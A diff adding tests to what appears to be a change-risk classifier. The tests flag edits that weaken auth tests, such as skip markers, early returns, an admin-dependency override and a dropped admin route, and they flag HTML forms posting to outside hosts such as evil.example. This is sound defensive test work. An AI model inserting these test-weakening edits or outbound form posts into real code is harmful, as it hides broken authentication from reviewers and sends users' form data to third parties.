@@ -562,6 +562,39 @@ test('an auth-named test file that only drops a literal list item and adds tests
   assert.equal(r.tier, 1, r.reasons.join('; '));
 });
 
+const weakenedAuthTest = (p, opts) => {
+  const r = outcome(p, opts);
+  assert.equal(r.tier, 2, `${p}: ${r.reasons.join('; ')}`);
+};
+
+test('#148: pytest.skip added to an auth-named test is tier 2', () => weakenedAuthTest('tests/test_login.py', { add: ['    pytest.skip("flaky")'] }));
+test('#148: #[ignore = reason] added to an auth-named test is tier 2', () => weakenedAuthTest('crates/app/tests/login.rs', { add: ['#[ignore = "flaky on CI"]'] }));
+test('#148: t.Skip added to an auth-named Go test is tier 2', () => weakenedAuthTest('auth_test.go', { add: ['\tt.Skip("later")'] }));
+test('#148: a bare return added to an auth-named Python test is tier 2', () => weakenedAuthTest('tests/test_session.py', { add: ['    return'] }));
+test('#148: a conditional return added to an auth-named TS test is tier 2', () => weakenedAuthTest('web/auth.test.ts', { add: ['  if (process.env.CI) return;'] }));
+test('#148: a dependency override added to an auth-named test is tier 2', () => weakenedAuthTest('tests/test_auth.py', { add: ['app.dependency_overrides[require_admin] = lambda: ADMIN'] }));
+test('#148: dropping a literal item from an auth-named test list is tier 2', () => weakenedAuthTest('tests/test_permissions.py', { del: ['    "/admin/users",'] }));
+
+test('#148: a skip added to any test file is a weakened test', () => {
+  for (const [p, line] of [['tests/test_models.py', '    pytest.skip("later")'], ['crates/app/tests/models.rs', '#[ignore = "slow"]'], ['models_test.go', '\tt.Skip("later")']]) {
+    const r = outcome(p, { add: [line] });
+    assert.ok(r.reasons.includes(`test skipped: ${p}`), `${line}: ${r.reasons.join('; ')}`);
+  }
+});
+
+const outboundForm = line => {
+  const p = 'templates/pay.html';
+  const r = outcome(p, { add: [line] });
+  assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
+};
+
+test('#148: a form action behind a template variable that is not the app base is outbound', () => outboundForm('<form method="post" action="{{ payment_gateway_url }}/charge">'));
+test('#148: an hx-post behind a template variable that is not the app base is outbound', () => outboundForm('<form method="post" hx-post="{{ webhook_url }}/notify">'));
+test('#148: a data-hx-post or data-hx-delete to an absolute URL is outbound', () => {
+  outboundForm('<form method="post" action="/x" data-hx-post="https://evil.example/x">');
+  outboundForm('<form method="post" action="/x" data-hx-delete="https://evil.example/x">');
+});
+
 test('a huge line of unclosed form tags is classified quickly', () => {
   const line = 'method="post" ' + ('<form a=' + 'x'.repeat(50)).repeat(20000);
   const started = Date.now();
